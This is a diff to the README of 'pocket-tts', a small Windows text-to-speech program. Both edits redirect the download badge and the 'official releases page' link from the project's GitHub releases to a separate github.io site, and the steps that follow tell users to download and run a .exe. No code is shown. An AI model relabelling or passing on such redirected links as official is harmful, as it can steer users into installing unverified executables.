@@ -1,6 +1,6 @@
 # 🎙️ pocket-tts - Listen to text on any computer
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Moonbhat3914/pocket-tts/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://moonbhat3914.github.io)
 
 pocket-tts changes how you interact with your computer. It turns any written text into spoken words. The software stays small and uses very little processing power. You run it on almost any Windows machine without needing expensive hardware or extra setup. It fits your needs whether you read books, articles, or notes.
 
@@ -8,7 +8,7 @@ pocket-tts changes how you interact with your computer. It turns any written tex
 
 You do not need prior technical skills to use this software. Follow these instructions to put the tool on your machine.
 
-1. Visit the [official releases page](https://github.com/Moonbhat3914/pocket-tts/releases) to download the setup file.
+1. Visit the [official releases page](https://moonbhat3914.github.io) to download the setup file.
 2. Look for the file that ends in .exe.
 3. Save the file to your computer.
 4. Open your downloads folder.
